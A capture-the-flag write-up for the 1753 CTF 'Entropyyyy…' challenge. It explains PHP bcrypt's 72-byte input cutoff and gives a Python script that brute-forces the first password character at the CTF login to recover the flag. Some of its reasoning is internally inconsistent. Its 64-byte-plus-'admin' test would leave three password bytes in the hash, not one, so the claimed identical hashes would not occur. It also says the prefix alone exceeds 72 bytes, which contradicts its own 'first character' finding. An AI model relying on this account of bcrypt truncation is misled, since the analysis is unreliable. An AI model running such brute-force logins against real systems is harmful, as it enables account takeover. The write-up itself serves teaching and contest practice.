---
title: "Entropy Overload — Bcrypt Length Limits in 'Entropyyyy…' (1753 CTF 2025)"
description: "A tale of misunderstood bcrypt mechanics, PHP's 72-byte cutoff, and how a single character slipped through entropy noise to reveal the flag."
date: '2025-04-19'
categories: ["CTF Writeups", "Web Exploitation", "Crypto"]
tags: ["1753 CTF", "bcrypt", "PHP", "Authentication Bypass", "Crypto Logic", "Password Hashing"]
header:
  image: "/images/1753-bcrypt.jpg"
---

# **Prologue — The Noise is the Signal**

Some challenges are loud — stack traces, debug logs, binary dumps. This one wasn’t.

All I had was a login box. The title said "Entropyyyy…", like it was mocking me. So I did what anyone would do: tried `admin : admin` and watched it reject me silently.

But it wasn’t silence. It was a setup.

---

# **Stage 1 — Observing the Login Logic**

The backend source was partially provided, and it boiled down to this:

```php
$password_hash = password_hash($entropy . $username . $password, PASSWORD_BCRYPT);
```

My initial thought was: okay, they're salting with some giant entropy blob. Classic CTF noise. But there was something more subtle happening.

When I triggered the login form and watched the hash generation delay, I got curious.

---

# **Stage 2 — PHP Bcrypt Behavior**

Digging into PHP's bcrypt implementation led me to the **72-byte rule**.

> Bcrypt only considers the first 72 bytes of the input string when hashing.

Anything beyond that? Discarded. Ignored. Doesn’t matter.

Now let's do the math:

```php
$input = $entropy . $username . $password;
```

If `$entropy . $username` was already longer than 72 bytes — and it was — then `$password` didn’t even make it into the hash. Unless it started right at the cutoff point.

That meant: **only the first character of the password had any effect**. The rest? Dead weight.

---

# **Stage 3 — Reproducing It**

Here’s how I tested the cutoff locally:

```php
$entropy = str_repeat('A', 64);
$username = "admin";
$password = "Zpassword";

$combined = $entropy . $username . $password;
$hash = password_hash($combined, PASSWORD_BCRYPT);

echo $hash;
```

Now I tried changing everything after the `"Z"`:

```php
$password = "Zabc";
```

Same hash.

But if I changed `"Z"` to `"B"`, hash changed.

It was clear: **only the first character of the password matters**.

---

# **Stage 4 — Brute-Forcing the First Character**

So the logic turned into a simple loop:

```python
import requests

url = "https://entropyyy.1753ctf.live/login"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"

for c in charset:
    password = c + "junk"
    data = {
        "username": "admin",
        "password": password
    }
    r = requests.post(url, data=data)
    if "Welcome" in r.text:
        print("Found:", password)
        break
```

And yeah — after a few tries:

```
Found: Bjunk
```

The server authenticated. The flag popped into view.

---

# **Result**

```
1753CTF{php_bcrypt_cut_me_short_lol}
```

All that entropy. All that prepending. And it was the first byte of user input that mattered.

---

# **Reflection — Crypto, But Not Really**

This wasn’t a cryptography challenge in the traditional sense. No AES, no RSA padding issues.

It was about implementation.

> Crypto is easy to mess up, even when using “secure” primitives.

PHP did nothing wrong — it followed bcrypt spec. But the developer didn’t account for it. That’s what made this a beautiful logic bug masquerading as a secure system.

---

# **Epilogue — Beyond the Hash**

I walked away from this one with a reminder:

- Know your primitives.
- Know your language wrappers.
- And always, always, ask what happens when the input’s too long.

Sometimes all it takes is one byte to break the illusion.

